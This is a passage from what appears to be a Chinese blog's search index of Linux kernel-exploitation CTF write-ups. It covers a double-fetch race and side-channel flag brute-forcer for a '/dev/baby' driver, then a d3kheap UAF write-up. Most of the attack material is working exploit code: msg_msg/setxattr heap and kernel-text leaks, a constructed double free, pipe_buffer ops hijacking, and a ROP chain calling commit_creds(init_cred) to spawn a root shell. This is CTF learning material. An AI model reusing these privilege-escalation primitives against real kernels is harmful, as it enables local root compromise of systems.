flag_addr;struct fake_flag&#123;    size_t *addr;    size_t size;&#125;;void change_flag_addr(void *s)&#123;    struct fake_flag *a = s;    while (finished == 0)    &#123;        a-&gt;addr = flag_addr;    &#125;&#125;int main(argc, argv)&#123;    setvbuf(stdin, 0, 2, 0);    setvbuf(stdout, 0, 2, 0);    setvbuf(stderr, 0, 2, 0);    struct fake_flag target;    int fd = open(&quot;/dev/baby&quot;, 0);    ioctl(fd, 0x6666);    system(&quot;dmesg &gt; record.txt&quot;);    int flag_addr_fd = open(&quot;./record.txt&quot;, O_RDONLY);    char buf[0x1000] = &#123;0&#125;;    lseek(flag_addr_fd, -0x1000, SEEK_END);    read(flag_addr_fd, buf, sizeof(buf));    close(flag_addr_fd);    char *idx;    idx = strstr(buf, &quot;Your flag is at &quot;);    flag_addr = strtoull(idx + 16, idx + 32, 16);    printf(&quot;[*]flag addr=&gt;%p\\n&quot;, flag_addr);    target.addr = buf;    target.size = 33;    pthread_t thread;    pthread_create(&amp;thread, NULL, change_flag_addr, &amp;target);    for (int i = 0; i &lt; Time; i++)    &#123;        ioctl(fd, 0x1337, &amp;target);        target.addr = buf;    &#125;    finished = 1;    pthread_join(thread, NULL);    close(fd);    puts(&quot;[+]result is :&quot;);    system(&quot;dmesg | grep flag&quot;);&#125;\n\n侧信道攻击名字虽然听起来很高端，实际干的事情就是爆破每一个字节。\n方法的原理就是：创建三个段，除了中间的段可读可写外，其他段的权限都为000，那么我们将flag放到第二个段的末尾，然后将猜测的字符放到最后一个，当最后一个字符不正确的时候就会直接退出，但是当最后一个字符正确的时候就会因为权限问题报错，并且系统崩溃\n\n#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;pthread.h&gt;#include &lt;sys/mman.h&gt;int main()&#123;    char *ch = &quot;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890,._-&quot;;    char flag[0x30] = &#123;0&#125;;    char command[0x100] = &#123;0&#125;;    char command1[0x100] = &#123;0&#125;;    FILE *fd = fopen(&quot;save.txt&quot;, &quot;r&quot;);    fscanf(fd, &quot;%s&quot;, flag);    fclose(fd);    for (int i = 0; i &lt; strlen(ch); i++)    &#123;        sprintf(command, &quot;echo \\&quot;%s%c\\&quot; &gt; save.txt&quot;, flag, ch[i]);        sprintf(command1, &quot;./exp %s%c&quot;, flag, ch[i]);        system(command);        system(command1);    &#125;&#125;\n\n#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;pthread.h&gt;#include &lt;sys/mman.h&gt;struct flag&#123;    size_t addr;    size_t size;&#125;;main(int argc, char *argv[])&#123;    char *buf;    mmap(0, 0x1000, PROT_NONE, MAP_SHARED | MAP_ANONYMOUS, 0, 0);    buf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, 0, 0);    mmap(0, 0x1000, PROT_NONE, MAP_SHARED | MAP_ANONYMOUS, 0, 0);    for (int i = 0; i &lt; strlen(argv[1]); i++)    &#123;        buf[0x1000 - strlen(argv[1]) + i] = argv[1][i];    &#125;    printf(&quot;[*]flag=&gt;%s\\n&quot;, argv[1]);    struct flag target;    target.size = 33;    target.addr = buf + 0x1000 - strlen(argv[1]);    int fd = open(&quot;/dev/baby&quot;, O_RDWR);    ioctl(fd, 0x1337, &amp;target);    close(fd);&#125;\n\n","categories":["Linux Kernel"],"tags":["侧信道攻击","Double Fetch"]},{"title":"kernel内存搜索技术","url":"/2022/09/16/kernel%E5%86%85%E5%AD%98%E6%90%9C%E7%B4%A2%E6%8A%80%E6%9C%AF/","content":"这里作为演示的例题为d3kheap，也是我拖了很久的复现题目，题目链接放在文章末尾。这篇文章使用的方法是作者的预期解的方法，也就是setxattr多次劫持msg_msg泄漏地址，在下一篇文章会记录第二种方法 CVE-2021-22555。\n题目分析void __fastcall d3kheap_ioctl(__int64 a1, __int64 a2)&#123;  void *v2; // rax  _fentry__(a1, a2);  raw_spin_lock(&amp;spin);  if ( (_DWORD)a2 != 0xDEAD )  &#123;    if ( (unsigned int)a2 &gt; 0xDEAD )      goto LABEL_13;    if ( (_DWORD)a2 == 0x1234 )    &#123;      if ( buf )      &#123;        printk(&amp;unk_480);      &#125;      else      &#123;        v2 = (void *)kmem_cache_alloc_trace(kmalloc_caches[10], 0xCC0LL, 1024LL);        ++ref_count;        buf = v2;        printk(&amp;unk_37A);      &#125;      goto LABEL_5;    &#125;    if ( (unsigned int)a2 &gt; 0x1233 &amp;&amp; ((_DWORD)a2 == 0x4321 || (_DWORD)a2 == 0xBEEF) )      printk(&amp;unk_3F0);    else      LABEL_13:    printk(&amp;unk_4F8);    LABEL_5:    pv_ops[79](&amp;spin);    return;  &#125;  if ( !buf )  &#123;    printk(&amp;unk_4A8);    goto LABEL_5;  &#125;  if ( ref_count )  &#123;    --ref_count;    kfree();    printk(&amp;unk_394);    goto LABEL_5;  &#125;  d3kheap_ioctl_cold();&#125;\n\n首先题目只有create和delete的功能，漏洞点在于ref_count的错误初始化：\nref_count dd 1\n\n然后就是编译选项的readme文档：\nCONFIG_STATIC_USERMODEHELPER=yCONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;CONFIG_SLUB=yCONFIG_SLAB_FREELIST_RANDOM=yCONFIG_SLAB_FREELIST_HARDENED=yCONFIG_HARDENED_USERCOPY=y\n\n\n开启了 Random Freelist（slab 的 freelist 会进行一定的随机化）\n开启了 Hardened Freelist（slab 的 freelist 中的 object 的 next 指针会与一个 cookie 进行异或（参照 glibc 的 safe-linking））\n开启了 Hardened Usercopy（在向内核拷贝数据时会进行检查，检查地址是否存在、是否在堆栈中、是否为 slab 中 object、是否非内核 .text 段内地址等等）\n开启了 Static Usermodehelper Path（modprobe_path 为只读，不可修改）\n\n所以总的来说题目只存在一个UAF漏洞，除此之外什么都没有了。\n这里不过多的介绍setxattr函数，在前一篇文章有介绍，这里主要内容还是放在这一项技术的实现手法。\nsetxattr多次劫持msg_msg实现泄漏构造UAF首先我们如果是要劫持msg_msg的堆块的话需要他是在free状态，所以我们需要构造出UAF，构造步骤为：\n\nadd()出一个size为1024的堆块\ndel()删除刚刚的堆块\n利用msgsnd生成一块1024大小的msg_msg结构体\n最后利用del()删除掉msg_msg结构体所在的堆块\n\n之后这个堆块虽然对msg_msg来说是正在使用的状态，但是在slub看来是已经被free掉的了。\nmsg_msg地址搜索原理当我们调用msgget时会创建一个消息队列时，在内核空间中会创建这样一个结构体，其表示一个消息队列：\n/* one msq_queue structure for each present queue on the system */struct msg_queue &#123;\tstruct kern_ipc_perm q_perm;\ttime64_t q_stime;\t\t/* last msgsnd time */\ttime64_t q_rtime;\t\t/* last msgrcv time */\ttime64_t q_ctime;\t\t/* last change time */\tunsigned long q_cbytes;\t\t/* current number of bytes on queue */\tunsigned long q_qnum;\t\t/* number of messages in queue */\tunsigned long q_qbytes;\t\t/* max number of bytes on queue */\tstruct pid *q_lspid;\t\t/* pid of last msgsnd */\tstruct pid *q_lrpid;\t\t/* last receive pid */\tstruct list_head q_messages;\tstruct list_head q_receivers;\tstruct list_head q_senders;&#125; __randomize_layout;\n\n而当我们调用 msgsnd 系统调用在指定消息队列上发送一条指定大小的 message 时，在内核空间中会创建这样一个结构体：\n/* one msg_msg structure for each message */struct msg_msg &#123;\tstruct list_head m_list;\tlong m_type;\tsize_t m_ts;\t\t/* message text size */\tstruct msg_msgseg *next;\tvoid *security;\t/* the actual message follows immediately */&#125;;\n\n所以在内核中这两个结构体会形成如下图所示的双向链表:\n\n如果这个消息队列中只存在一个消息则会形成如下链表：\n\n接下来深入看一下msg_msg结构体的创建，当我们使用msgsed函数时：\nstatic long do_msgsnd(int msqid, long mtype, void __user *mtext,                      size_t msgsz, int msgflg)&#123;  struct msg_queue *msq;  struct msg_msg *msg;  int err;  struct ipc_namespace *ns;  DEFINE_WAKE_Q(wake_q);  ns = current-&gt;nsproxy-&gt;ipc_ns;  if (msgsz &gt; ns-&gt;msg_ctlmax || (long) msgsz &lt; 0 || msqid &lt; 0)    return -EINVAL;  if (mtype &lt; 1)    return -EINVAL;  msg = load_msg(mtext, msgsz);  //...\n\n会调用loda_msg函数，而load_msg函数最终会调用alloc_msg函数：\nstruct msg_msg *load_msg(const void __user *src, size_t len)&#123;\tstruct msg_msg *msg;\tstruct msg_msgseg *seg;\tint err = -EFAULT;\tsize_t alen;\tmsg = alloc_msg(len);    //...\n\n阅读源码可以看到其会判断生成的msg_msg的结构体是否小于DATALEN_MSG也就是\n#define DATALEN_MSG\t((size_t)PAGE_SIZE-sizeof(struct msg_msg))\n\n如果小于则直接生产一个msg_msg结构体，如果大于会生成另外一个msg_msgseg结构体\nstatic struct msg_msg *alloc_msg(size_t len)&#123;  struct msg_msg *msg;  struct msg_msgseg **pseg;  size_t alen;  alen = min(len, DATALEN_MSG);  msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT);  if (msg == NULL)    return NULL;  msg-&gt;next = NULL;  msg-&gt;security = NULL;  len -= alen;  pseg = &amp;msg-&gt;next;  while (len &gt; 0) &#123;    struct msg_msgseg *seg;    cond_resched();    alen = min(len, DATALEN_SEG);    seg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT);    if (seg == NULL)      goto out_err;    *pseg = seg;    seg-&gt;next = NULL;    pseg = &amp;seg-&gt;next;    len -= alen;  &#125;  return msg;  out_err:  free_msg(msg);  return NULL;&#125;\n\n总结上述的生成方式也就是：\n\n对于大小在【一个页面再减掉作为 header 的 msg_msg 的 size】范围内的数据而言，内核仅会分配一个 size + header size 大小的 object（通过 kmalloc），其前 0x30 大小的部分存放 msg_msg 这一 header，剩余部分用以存放用户数据\n对于大小超出【一个页面再减掉作为 header 的 msg_msg 的 size】范围的数据而言，其会额外生成 msg_msgseg 结构体来存放用户数据，通过 kmalloc 分配，大小为剩余未拷贝的用户数据大小加上 next 指针；该结构体与 msg_msg 的 next 成员形成一个单向链表，其前 8 字节存放指向下一个 msg_msgseg 的指针，若无则为 NULL\n\n\n有了上述依据我们不难想到，我们可以通过修改m_ts的值来实现堆上的越界数据读取，并且我们可以通过next指针来实现任意地址数据泄漏。但是这里存在这样一个问题，当我们使用msgrcv来读取数据时会调用list_del函数:\nstatic long do_msgrcv(int msqid, void __user *buf, size_t bufsz, long msgtyp, int msgflg,                      long (*msg_handler)(void __user *, struct msg_msg *, size_t))&#123;  //...  list_del(&amp;msg-&gt;m_list);  //...  goto out_unlock0;  //...  out_unlock0:  ipc_unlock_object(&amp;msq-&gt;q_perm);  wake_up_q(&amp;wake_q);  out_unlock1:  rcu_read_unlock();  if (IS_ERR(msg)) &#123;    free_copy(copy);    return PTR_ERR(msg);  &#125;  bufsz = msg_handler(buf, msg, bufsz);  free_msg(msg);  return bufsz;&#125;\n\nstatic inline void list_del(struct list_head *entry)&#123;\t__list_del_entry(entry);\tentry-&gt;next = LIST_POISON1;\tentry-&gt;prev = LIST_POISON2;&#125;\n\n可以看到在list_del函数内部是会进行指针赋值的，所以如果存在非法地址的应用会造成panic，但是就目前为止我们还不知道任何内核地址，所以造成panic时肯定的。因此，为了绕过这一函数，并且可以读取内容我们需要修改msgrcv函数的标识位为MSG_COPY则内核会将 message 拷贝一份后再拷贝到用户空间，原双向链表中的 message 并不会被 unlink，从而我们便可以多次重复地读取同一个 msg_msg 结构体中数据:\n//...if (msgflg &amp; MSG_COPY) &#123;  if ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))    return -EINVAL;  copy = prepare_copy(buf, min_t(size_t, bufsz, ns-&gt;msg_ctlmax));  if (IS_ERR(copy))    return PTR_ERR(copy);&#125;//.../*\t\t * If we are copying, then do not unlink message and do\t\t * not update queue parameters.\t\t */  if (msgflg &amp; MSG_COPY) &#123;    msg = copy_msg(msg, copy);    goto out_unlock0;  &#125;//...\n\n接下来我们考虑越界读取的详细过程，我们首先可以利用 setxattr 修改 msg_msg 的 next 指针为 NULL、将其 m_ts 改为 0x1000 - 0x30（在 next 指针为 NULL 的情况下，一个 msg_msg 结构体最大占用一张内存页的大小），从而越界读出内核堆上数据。但是接下来我们需要进行地址搜索，所以需要搜索的地址为合法的，也就是next指针必须是合法的，如果next为非法指针则会引起kernel panic。\nstruct msg_msg *copy_msg(struct msg_msg *src, struct msg_msg *dst)&#123;  struct msg_msgseg *dst_pseg, *src_pseg;  size_t len = src-&gt;m_ts;  size_t alen;  if (src-&gt;m_ts &gt; dst-&gt;m_ts)    return ERR_PTR(-EINVAL);  alen = min(len, DATALEN_MSG);  memcpy(dst + 1, src + 1, alen);  for (dst_pseg = dst-&gt;next, src_pseg = src-&gt;next;       src_pseg != NULL;       dst_pseg = dst_pseg-&gt;next, src_pseg = src_pseg-&gt;next) &#123;    len -= alen;    alen = min(len, DATALEN_SEG);    memcpy(dst_pseg + 1, src_pseg + 1, alen);  &#125;  dst-&gt;m_type = src-&gt;m_type;  dst-&gt;m_ts = src-&gt;m_ts;  return dst;&#125;\n\n所以我们需要确保获得一个合法的堆上地址进行搜索的同时确保我们所构造的next 链上皆为合法地址，并以 NULL 结尾，如何找到这样一个地址？\n总所周知，slub 会向 buddy system 申请一张或多张连续内存页，将其分割为指定大小的 object 之后再返还给 kmalloc 的 caller，对于大小为 1024 的 object，其每次申请的连续内存页为四张，分为 16 个 object\n# cat /proc/slabinfo slabinfo - version: 2.1# name            &lt;active_objs&gt; &lt;num_objs&gt; &lt;objsize&gt; &lt;objperslab&gt; &lt;pagesperslab&gt; : tunables &lt;limit&gt; &lt;batchcount&gt; &lt;sharedfactor&gt; : slabdata &lt;active_slabs&gt; &lt;num_slabs&gt; &lt;sharedavail&gt;# ...kmalloc-1k           464    464   1024   16    4 : tunables    0    0    0 : slabdata     29     29      0# ...\n\n如果是我们分配多个大小同为 1024 的 msg_msg 结构体，则其很容易落在地址连续的 4 张内存页上，此时若是我们从其中一个 msg_msg 结构体向后进行越界读，则很容易读取到其他的 msg_msg 结构体的数据，其 m_list 成员可以帮助我们泄露出一个堆上地址\n\n在前面这个链表中可以看出来是互相指向的，这里调试可以看到m_list的成员是只想msg_queue结构体的q_message域，而msg_queue结构体的q_message域也是只想msg_msg结构体的m_list域。\n此时按照常规思路就是首先泄漏出m_list结构内部的msg_queue结构体的地址，然后在msg_queue结构体向下进行搜索。虽然这种可以但是在后续进行ROP时会出现问题，这里先不提了后面再做解释，目前需要注意的是这里还是需要泄漏出msg_msg结构体的地址。\n虽然目前来看我们已经通过越界数据读取获得了一个堆地址也就是msg_queue地址，但是我们在读取过程中是将msg_queue结构体当作msg_msgseg结构体来进行阅读，所以我们需要保证他的next指针为NULL。不过幸运的是，msg_queue-&gt;q_lrpid 在未使用 msgrcv 接收消息时为 NULL，该成员在 q_message 成员向前的 8 字节处，因此我们可以将 next 指针指向这个位置。\n到目前为止我们所有存在的问题基本都已经解决了，已经可以开始进行内存搜索了。不过这里泄漏出来的kernel text地址是不一定的，原作者使用的办法是写一个字典来进行匹配，我这里也属实没有更好的解决办法了，所以继续延用了原作者的办法。\npipe_buffer劫持执行流构造double free这里原作者阐述了为什么不使用修改cred结构体，但是就目前来说我们想要实现任意地址写的话需要控制free堆块的类似fd指针的东西，所以我们需要使用到userfaultfd技术但是内核版本 5.11 起 userfaultfd 系统调用被限制为 root 权限才能使用，所以这条路基本是寄了。所以这里还是选择常规的劫持执行流。\n因为在kernel中堆检测类似于fast bin的检测，所以我们需要形成A-&gt;B-&gt;A这样的结构。并且，我们在形成double free的方式是需要进行msgrcv来实现的，所以我们需要在free之前恢复结构。\n劫持RIPpipe_buffer 这一结构体，当我们创建一个管道时，在内核中会生成数个连续的该结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个 object\n/** *\tstruct pipe_buffer - a linux kernel pipe buffer *\t@page: the page containing the data for the pipe buffer *\t@offset: offset of data inside the @page *\t@len: length of data inside the @page *\t@ops: operations associated with this buffer. See @pipe_buf_operations. *\t@flags: pipe buffer flags. See above. *\t@private: private data owned by the ops. **/struct pipe_buffer &#123;\tstruct page *page;\tunsigned int offset, len;\tconst struct pipe_buf_operations *ops;\tunsigned int flags;\tunsigned long private;&#125;;\n\n而当我们关闭了管道的两端时，会触发 pipe_buffer-&gt;pipe_buffer_operations-&gt;release 这一指针，因此我们只需要劫持其函数表即可，劫持的位置也很清晰：因为我们最终使用的setxattr函数来进行修改pipe_buffer的内容的，所以这里就体会到了我前面所说的为什么要泄漏msg_msg的地址了，我们需要将ops劫持到他自身。并在上面写上rop进行栈迁移，因为经过调试发现执行gagdte的时候rsi 寄存器指向 pipe_buffer，因此笔者选择了一条 push rsi ; pop rsp ; pop 4 vals ; ret 的 gadget 完成栈迁移\n综上，exp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/mman.h&gt;#include &lt;signal.h&gt;#include &lt;sys/prctl.h&gt;#define MSG_COPY 040000size_t kernelLeakQuery(size_t kernel_text_leak)&#123;    size_t kernel_offset = 0xdeadbeef;    switch (kernel_text_leak &amp; 0xfff)    &#123;    case 0x6e9:        kernel_offset = kernel_text_leak - 0xffffffff812b76e9;        break;    case 0x980:        kernel_offset = kernel_text_leak - 0xffffffff82101980;        break;    case 0x440:        kernel_offset = kernel_text_leak - 0xffffffff82e77440;        break;    case 0xde7:        kernel_offset = kernel_text_leak - 0xffffffff82411de7;        break;    case 0x4f0:        kernel_offset = kernel_text_leak - 0xffffffff817894f0;        break;    case 0xc90:        kernel_offset = kernel_text_leak - 0xffffffff833fac90;        break;    case 0x785:        kernel_offset = kernel_text_leak - 0xffffffff823c3785;        break;    case 0x990:        kernel_offset = kernel_text_leak - 0xffffffff810b2990;        break;    case 0x900:        kernel_offset = kernel_text_leak - 0xffffffff82e49900;        break;    case 0x8b4:        kernel_offset = kernel_text_leak - 0xffffffff8111b8b4;        break;    case 0xc40:        kernel_offset = kernel_text_leak - 0xffffffff8204ac40;        break;    case 0x320:        kernel_offset = kernel_text_leak - 0xffffffff8155c320;        break;    case 0xee0:        kernel_offset = kernel_text_leak - 0xffffffff810d6ee0;        break;    case 0x5e0:        kernel_offset = kernel_text_leak - 0xffffffff810e55e0;        break;    case 0xe80:        kernel_offset = kernel_text_leak - 0xffffffff82f05e80;        break;    case 0x260:        kernel_offset = kernel_text_leak - 0xffffffff82ec0260;        break;    case 0xb50:        kernel_offset = kernel_text_leak - 0xffffffff82dd4b50;        break;    case 0x620:        kernel_offset = kernel_text_leak - 0xffffffff8109e620;        break;    case 0xa00:        kernel_offset = kernel_text_leak - 0xffffffff82f04a00;        break;    case 0x300:        kernel_offset = kernel_text_leak - 0xffffffff81b25300;        break;    case 0xbe0:        kernel_offset = kernel_text_leak - 0xffffffff82e11be0;        break;    case 0x8b0:        kernel_offset = kernel_text_leak - 0xffffffff8115b8b0;        break;    case 0x5da:        kernel_offset = kernel_text_leak - 0xffffffff824505da;        break;    case 0x3c2:        kernel_offset = kernel_text_leak - 0xffffffff824073c2;        break;    case 0xd80:        kernel_offset = kernel_text_leak - 0xffffffff82eaed80;        break;    case 0x5cb:        kernel_offset = kernel_text_leak - 0xffffffff824505cb;        break;    case 0x3c3:        kernel_offset = kernel_text_leak - 0xffffffff8240b3c3;        break;    default:        puts(&quot;[x] fill up your dict!&quot;);        break;    &#125;    if ((kernel_offset % 0x100000) != 0) // miss hit?        kernel_offset = 0xdeadbeef;    return kernel_offset;&#125;typedef struct&#123;    long mtype;    char mtext[1];&#125; msg;struct list_head&#123;    struct list_head *next, *prev;&#125;;struct msg_msg&#123;    struct list_head m_list;    long m_type;    size_t m_ts;    /* message text size */    void *next;     /* struct msg_msgseg *next; */    void *security; /* NULL without SELinux */    /* the actual message follows immediately */&#125;;size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;void getShell()&#123;    if (getuid())    &#123;        printf(&quot;\\033[31m\\033[1m[x] Failed to get the root!\\033[0m\\n&quot;);        exit(-1);    &#125;    printf(&quot;\\033[32m\\033[1m[+] Successful to get the root. Execve root shell now...\\033[0m\\n&quot;);    system(&quot;/bin/sh&quot;);&#125;int fd;void add()&#123;    ioctl(fd, 0x1234);&#125;void del()&#123;    ioctl(fd, 0xDEAD);&#125;int main()&#123;    save_status();    fd = open(&quot;/dev/d3kheap&quot;, O_RDONLY);    if (fd &lt; 0)    &#123;        puts(&quot;[*]open d3kheap error!&quot;);        exit(0);    &#125;    char *buf = malloc(0x4000);    int ret;    unsigned long kernel_heap_leak;    unsigned long *pointer_buf = malloc(0x4000);    int kmsg_idx;    int ms_qid[0x100];    unsigned long kernel_text_leak = NULL;    unsigned long kernel_base;    unsigned long kernel_offset;    unsigned long kmsg_addr = NULL;    unsigned long search_addr;    int idx;    int pipe_fd[2];    int pipe_fd2[2];    unsigned long fake_ops_offset;    unsigned long fake_ops_addr;    add();    del();    for (int i = 0; i &lt; 5; i++)    &#123;        ms_qid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);        if (ms_qid[i] &lt; 0)        &#123;            puts(&quot;[x] msgget!&quot;);            return -1;        &#125;    &#125;    for (int i = 0; i &lt; 5; i++)    &#123;        memset(buf, &#x27;A&#x27; + i, 0X1000 - 8);        ret = msgsnd(ms_qid[i], buf, 1024 - 0x30, 0);        if (ret &lt; 0)        &#123;            puts(&quot;[x] msgsnd!&quot;);            return -1;        &#125;    &#125;    del();    memset(buf, &#x27;Z&#x27;, 0x1000 - 8);    ((struct msg_msg *)buf)-&gt;m_list.next = NULL;    ((struct msg_msg *)buf)-&gt;m_list.prev = NULL;    ((struct msg_msg *)buf)-&gt;m_type = NULL;    ((struct msg_msg *)buf)-&gt;m_ts = 0x1000 - 0x30;    ((struct msg_msg *)buf)-&gt;next = NULL;    ((struct msg_msg *)buf)-&gt;security = NULL;    setxattr(&quot;/exp&quot;, &quot;196082&quot;, buf, 1024 - 0x30, 0);    ret = msgrcv(ms_qid[0], buf, 0x1000 - 0x30, 0, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);    if (ret &lt; 0)    &#123;        printf(&quot;[x] msgrcv!&quot;);        return -1;    &#125;    pointer_buf = (unsigned long)buf;    kernel_heap_leak = NULL;    for (int i = 0; i &lt; (0x1000 - 0x30) / 8; i++)    &#123;        // printf(&quot;[----data dump----][%d] %p\\n&quot;, i, pointer_buf[i]);        if (((pointer_buf[i] &amp; 0xffff000000000000) == 0xffff000000000000) &amp;&amp; !kernel_heap_leak &amp;&amp; (pointer_buf[i + 3] == (1024 - 0x30)))        &#123;            printf(&quot;[+] We got heap leak! kheap: %p\\n&quot;, pointer_buf[i]);            printf(&quot;idx=&gt;%d\\n&quot;, (int)(((char *)(&amp;pointer_buf[i + 2]))[0] - &#x27;A&#x27;));            idx = (int)(((char *)(&amp;pointer_buf[i + 2]))[0] - &#x27;A&#x27;);            kernel_heap_leak = pointer_buf[i];            fake_ops_offset = i * 8 + 0x30 - 8;            break;        &#125;    &#125;    if (!kernel_heap_leak)    &#123;        printf(&quot;[x] Failed to leak kernel heap!&quot;);        exit(-1);    &#125;    search_addr = kernel_heap_leak - 8;    int leaking_times = 0;    while (1)    &#123;        ((struct msg_msg *)buf)-&gt;m_list.next = NULL;        ((struct msg_msg *)buf)-&gt;m_list.prev = NULL;        ((struct msg_msg *)buf)-&gt;m_type = NULL;        ((struct msg_msg *)buf)-&gt;m_ts = 0x2000 - 0x30;        ((struct msg_msg *)buf)-&gt;next = search_addr;        ((struct msg_msg *)buf)-&gt;security = NULL;        setxattr(&quot;/exp&quot;, &quot;196082&quot;, buf, 1024 - 0x30, 0);        printf(&quot;[*] per leaking, no.%d time(s)\\n&quot;, leaking_times);        ret = msgrcv(ms_qid[0], buf, 0x2000 - 0x30, 0, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);        leaking_times++;        if (leaking_times == 100 &amp;&amp; !kernel_text_leak)        &#123;            return -1;        &#125;        if (ret &lt; 0)        &#123;            printf(&quot;[x] msgrcv!&quot;);            search_addr += 0x1000 - 8;            continue;        &#125;        pointer_buf = (unsigned long)buf;        if (leaking_times == 1 &amp;&amp; !kmsg_addr)        &#123;            kmsg_addr = pointer_buf[(0x1000 - 0x30) / 8 + 1];            fake_ops_addr = kmsg_addr - fake_ops_offset;            printf(&quot;[*] fake ops addr=&gt;%p\\n&quot;, fake_ops_addr);        &#125;        for (int i = (0x1000 - 0x30) / 8; i &lt; (0x2000 - 0x30) / 8; i++)        &#123;            if ((pointer_buf[i] &gt; 0xffffffff81000000) &amp;&amp; (pointer_buf[i] &lt; 0xffffffffbfffffff) &amp;&amp; !kernel_text_leak)            &#123;                printf(&quot;[*] We got text leak! ktext: %p\\n&quot;, pointer_buf[i]);                kernel_text_leak = pointer_buf[i];                kernel_offset = kernelLeakQuery(kernel_text_leak);                if (kernel_offset == 0xdeadbeef)                &#123;                    printf(&quot;[-] cant found kernel offset\\n&quot;);                    return 0;                &#125;                kernel_base = kernel_offset + 0xffffffff81000000;                break;            &#125;        &#125;        if (kernel_text_leak &gt; 0xffffffff81000000 &amp;&amp; kernel_text_leak &lt; 0xffffffffbfffffff)        &#123;            break;        &#125;    &#125;    printf(&quot;[+] kernel base: %p\\n&quot;, kernel_base);    printf(&quot;[+] kernel offset: %p\\n&quot;, kernel_offset);    ((struct msg_msg *)buf)-&gt;m_list.next = search_addr;    ((struct msg_msg *)buf)-&gt;m_list.prev = search_addr;    ((struct msg_msg *)buf)-&gt;m_type = NULL;    ((struct msg_msg *)buf)-&gt;m_ts = 1024 - 0x30;    ((struct msg_msg *)buf)-&gt;next = NULL;    ((struct msg_msg *)buf)-&gt;security = NULL;    setxattr(&quot;/exp&quot;, &quot;196082&quot;, buf, 1024 - 0x30, 0);    ret = msgrcv(ms_qid[idx], buf, 1024 - 0x30, 0, IPC_NOWAIT | MSG_NOERROR);    if (ret &lt; 0)    &#123;        puts(&quot;[x] msgrcv!&quot;);        return -1;    &#125;    puts(&quot;[*] the gap is freed&quot;);    ret = msgrcv(ms_qid[0], buf, 1024 - 0x30, 0, IPC_NOWAIT | MSG_NOERROR);    if (ret &lt; 0)    &#123;        puts(&quot;[x] msgrcv!&quot;);        return -1;    &#125;    puts(&quot;[+] double free done!&quot;);    pipe(pipe_fd);    pipe(pipe_fd2);    memset(pointer_buf, &#x27;B&#x27;, 0x1000);    pointer_buf[1] = 0xffffffff812dbede + kernel_offset;    pointer_buf[2] = fake_ops_addr;    unsigned long pop_rdi = 0xffffffff810938f0 + kernel_offset;    unsigned long init_cred = 0xffffffff82c6d580 + kernel_offset;    unsigned long commit_cred = 0xffffffff810d25c0 + kernel_offset;    unsigned long swapgs_restore_regs_and_return_to_usermode = 0xffffffff81c00ff0 + kernel_offset;    int rop = 4;    pointer_buf[rop++] = pop_rdi;    pointer_buf[rop++] = init_cred;    pointer_buf[rop++] = commit_cred;    pointer_buf[rop++] = swapgs_restore_regs_and_return_to_usermode + 0x16;    pointer_buf[rop++] = 0;    pointer_buf[rop++] = 0;    pointer_buf[rop++] = getShell;    pointer_buf[rop++] = user_cs;    pointer_buf[rop++] = user_rflags;    pointer_buf[rop++] = user_sp;    pointer_buf[rop++] = user_ss;    setxattr(&quot;/exp&quot;, &quot;196082&quot;, pointer_buf, 1024 - 0x30, 0);    printf(&quot;gadget addr =&gt; %p\\n&quot;, pointer_buf[1]);    close(pipe_fd[0]);    close(pipe_fd[1]);    return 0;&#125;\n\n\n补充一下这里解释一下为什么使用swapgs_restore_regs_and_return_to_usermode+0x16首先这里是ROP所以我们需要的是最后swapgs然后iretq，并且这里是开启了KPTI保护的，所以我们在最后还需要修改cr3寄存器。其次为什么要加上0x16呢？首先我们要知道的是前面的pop对我们来说并没有什么用。其次就是在切换完cr3之后我们还有两次pop所以我们需要保证rsp也是在可以识别的，最终根据上述要求我们必须选择swapgs_restore_regs_and_return_to_usermode+0x16。\n\n参考链接：https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/#0x01-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90\n题目链接：https://github.com/196082/196082/blob/main/kernel_pwn/d3kheap.zip\n","categories":["Linux Kernel"],"tags":["msg_msg","pipe_buffer","setxattr"]},{"title":"kernel pwn基础","url":"/2022/03/21/kernel-pwn%E5%9F%BA%E7%A1%80/","content":"在学习kernel pwn我就是完全跟着wiki走的\nCISCN2017 - babydriver前置首先题目一般是会给我们三个文件，bzImage，boot.sh，rootfs.cpio\nboot.sh：启动kernel的shell脚本\nbzImage：kernel binary\nrootfs.cpio：文件系统\n这里要看文件系统的话需要先改变尾缀为gz，然后gunzip rootfs.cpio.gz，最后再cpio -idmv &lt; rootfs.cpio\n~/download/study_kernel/core 